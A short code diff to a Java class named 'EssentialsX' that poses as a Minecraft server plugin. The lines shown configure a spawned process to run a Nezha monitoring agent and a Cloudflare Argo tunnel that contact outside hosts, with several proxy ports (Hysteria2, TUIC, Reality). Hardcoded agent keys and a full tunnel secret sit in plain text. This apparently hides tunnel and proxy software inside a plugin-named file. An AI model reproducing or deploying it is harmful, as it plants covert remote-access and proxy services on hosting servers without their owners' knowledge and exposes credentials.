@@ -73,17 +73,17 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "a7c8bee2-5e5f-4143-8704-fe1336cbbedb");
+        env.put("UUID", "c2f07367-c82a-48fb-a565-3f2aa0839bcb");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "sui.uuz.us.kg:443");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "T5tS7ogr7RdD4IuIW93BL8wHs5d1PB5N");
-        env.put("ARGO_PORT", "8080");
-        env.put("ARGO_DOMAIN", "hiden.blue.xx.kg");
-        env.put("ARGO_AUTH", "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiNzJlNjYxZTMtYmE0MS00NjQzLTk3MmYtNDJjYzk2OWM0ZDk5IiwicyI6Ik1UVTVNbU13T1dJdE1HTm1OeTAwTlRFM0xXSTRaalV0T1dZMFlUQTNPV1F4WWprMyJ9");
+        env.put("ARGO_PORT", "");
+        env.put("ARGO_DOMAIN", "mcsg.uuz.us.kg");
+        env.put("ARGO_AUTH", "{"AccountTag":"543d4de43b0d21acb49822bddb577d94","TunnelSecret":"7Z6t8C/c3BXtcmNNkQ6IuCp6MALzdnOmeDMmEhH9FNA=","TunnelID":"77397f3f-dd59-4aa6-b6de-1a343b46385d","Endpoint":""}");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "24637");
-        env.put("TUIC_PORT", "25453");
+        env.put("HY2_PORT", "");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "Hiden");
+        env.put("NAME", "MC");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
